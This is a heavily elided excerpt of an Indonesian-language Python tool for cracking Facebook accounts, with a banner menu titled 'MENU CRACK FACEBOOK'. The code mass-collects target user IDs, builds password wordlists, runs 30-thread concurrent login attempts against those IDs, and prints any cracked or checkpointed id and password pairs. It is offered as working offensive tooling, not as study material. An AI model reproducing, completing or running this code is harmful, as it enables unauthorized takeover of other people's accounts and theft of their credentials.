...
def login_lagi334():
	try:
		...
		print(f'  {x}[{h}•{x}]{h} LOGIN BERHASIL.........JALANKAN LAGI MURIDKU PERINTAHNYA !!!{x} ');time.sleep(1)
		exit()
	except Exception as e:
...
def menu(my_name,my_id):
	...
	banner()
	sg = '# 🖥️ INFORMASI PENGUNA 🖥️'
	fx = mark(sg, style='green')
	sol().print(fx)
	print(x+'['+h+'•'+x+'] USER AKTIF  : '+str(my_name))
...
[00] LOGOUT[bold cyan]'''
	...
	cetak(nel(oi, title='[bold cyan] • MENU CRACK FACEBOOK • [/bold cyan]'))
...
def dump_massal():
	try:
		...
		exit()
	try:
		jum = int(input('➟ MAU BERAPA TARGET BEB ? : '))
	except ValueError:
		print('➟ MASUKAN ANGKA BEB , MALAH HURUF ')
		exit()
	if jum<1 or jum>100:
		print('➟ GAGAGL DUMP ID ')
		exit()
	ses=requests.Session()
	yz = 0
	...
	for userr in uid:
		try:
			...
			print('➤ SINYAL LU NGGAK CONNECT ')
			exit()
	try:
		print('')
		print(f'➤ TOTAL ID LU TERKUMPUL 👽 {h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print('➤ SINYAL LU KE TAEK ')
		back()
	except (KeyError,IOError):
...
def dump_pengikut():
	...
	sol().print(win2)
	print(x+'['+h+'•'+x+'] KETIK "me" JIKA ANDA INGIN DUMP DARI PENGIKUT ANDA')
...
def setting():
	...
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		krek = '[•] GUNAKAN TANDA KOMA SEBAGAI TERPISAH\n[•] GUNAKAN HURUF RENDAH\n[•] CONTOH: indonesia,sayang,pepek,ralanganteng,kontol,germany,bangladesh'
		cetak(nel(krek, title=' • TAMBAHKAN PASSWORD • '))
...
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print(f'↪ {m}•{k}•{h}•{x} SEDANG MENGGESER SATELIT NASA {m}•{k}•{h}•{x} ↩ ')
	print('')
	...
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				...
				pool.submit(crackmbasic,idf,pwv)
	print('')
	cetak(nel('\t[green] CRACK SELESAI MURIDKU , JANGAN LUPA BERSYUKUR[cyan] ✓[white] '))
	...
	if woi in ['y','Y']:
		...
		print(f'\t{x}↪ {k}LU JELEK KENAPA KELUAR {x} ↩ ')
		time.sleep(2)
		exit()
#--------------------[ METODE-B-API ]-----------------#
def crack(idf,pwv):
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					print('\n')
					print(f"\33[1;33m╚══[CP R4L4N]\33[1;33m{idf}\33[m•\33[1;33m{pw}\n")
					cp+=1
				break
				...
				if 'no' in taplikasi:
					...
					print('\n')
					print(f"\33[1;32m╚══[OK R4L4N]\33[1;96m{idf}\33[m•\33[1;96m{pw}\n")
					break
